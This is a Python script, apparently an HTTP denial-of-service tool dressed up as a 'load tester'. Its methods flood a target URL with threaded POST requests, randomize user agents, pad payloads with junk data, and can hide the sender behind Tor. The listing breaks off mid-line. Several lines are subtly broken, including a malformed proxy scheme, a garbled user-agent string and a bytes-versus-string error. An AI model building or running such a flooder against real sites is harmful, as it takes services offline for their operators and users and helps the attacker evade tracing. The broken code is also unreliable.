#!/usr/bin/python3
import argparse
import requests
import threading
import random
import string
import time
import sys
import os
import psutil
import logging
from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter
from queue import Queue
from threading import Thread
from random import randint
import json
from colorama import init, Fore, Style
import pyfiglet
from termcolor import colored

init(autoreset=True)

class HTTPLoadTester:
    def __init__(self):
        self.session = requests.Session()
        self.retries = Retry(total=5, backoff_factor=1, status_forcelist=[500, 502, 503, 504])
        self.adapter = HTTPAdapter(max_retries=self.retries, pool_connections=100, pool_maxsize=100)
        self.session.mount('http://', self.adapter)
        self.session.mount('https://', self.adapter)
        self.response_times = []
        self.lock = threading.Lock()
        self.error_count = 0
        self.request_queue = Queue()
        self.logger = logging.getLogger('http_load_tester')
        self.logger.setLevel(logging.INFO)
        self.logger.addHandler(logging.FileHandler('httpdus3.log'))

    def generate_user_agent(self):
        platforms = ['Macintosh; Intel Mac OS X 10_15_7', 'Windows NT 10.0; Win64; x64', 'X11; Linux x86_64', 'Linux armv7l']
        browsers = ['Chrome', 'Firefox', 'Safari', 'Opera', 'Edge', 'Internet Explorer']
        versions = [''.join(random.choices(string.digits, k=2)) + '.0']
        return random.choice(browsers) + '/' + random.choice(versions) + '' + random.choice(platforms) + ')'

    def generate_random_data(self, length):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def send_request(self, url, amplification_data, obfuscation_data, use_tor=False, custom_headers=None, packet_size=None):
        headers = {
            'User-Agent': self.generate_user_agent(),
            'Accept-Encoding': 'gzip, deflate',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Connection': 'keep-alive',
        }

        if custom_headers:
            headers.update(custom_headers)

        proxies = None
        if use_tor:
            proxies = {
                'http': 'ocks5://127.0.0.1:9050',
                'https': 'ocks5://127.0.0.1:9050'
            }

        try:
            start_time = time.time()
            if packet_size:
                payload = amplification_data + obfuscation_data.encode()[:packet_size]
            else:
                payload = amplification_data + obfuscation_data.encode()
            response = self.session.post(url, headers=headers, data=payload, timeout=10, proxies=proxies)
            elapsed_time = time.time() - start_time
            with self.lock:
                self.response_times.append(elapsed_time)
            self.logger.info(f"Response from {url}: {response.status_code} (Time: {elapsed_time:.2f} seconds)")
            print(f"Response from {url}: {response.status_code} (Time: {elapsed_time:.2f} seconds)")
        except requests.exceptions.RequestException as e:
            self.logger.error(f"Error sending request to {url}: {e}")
            print(f"Error sending request to {url}: {e}")
            with self.lock:
                self.error_count += 1

    def worker(self):
        while True:
            url, amplification_data, obfuscation_data, use_tor, custom_headers, packet_size = self.request_queue.get()
            self.send_request(url, amplification_data, obfuscation_data, use_tor, custom_headers, packet_size)
            self.request_queue.task_done()

    def volumetric_attack(self, url, num_requests, amplification_data, obfuscation_data, use_tor=False, custom_headers=None, packet_size=None):
        for _ in range(num_requests):
            self.request_queue.put((url, amplification_data, obfuscation_data, use_tor, custom_headers, packet_size))

    def application_layer_attack(self, url, num_requests, obfuscation_data, use_tor=False, custom_headers=None, packet_size=None):
        for _ in range(num_requests):
            self.request_queue.put((url, b'', obfuscation_data, use_tor, custom_headers, packet_size))

    def protocol_attack(self, url, num_requests, amplification_data, use_tor=False, custom_headers=None, packet_size=None):
        for _ in range(num_requests):
            self.request_queue.put((url, amplification_data, b'', use_tor, custom_headers, packet_size))

    def run_attack(self, url, num_threads, num_requests, attack_type, amplification_url=None, use_tor=False, custom_headers=None, packet_size=None):
        amplification_data = self.session.get(amplification_url).content if amplification_url else b''
        obfuscation_data = self.generate_random_data(random.randint(100, 1000))

        for _ in range(num_threads):
            thread = Thread(target=self.worker)
            thread.daemon = True
            thread.start()

        if attack_type == 'volumetric':
            self.vol
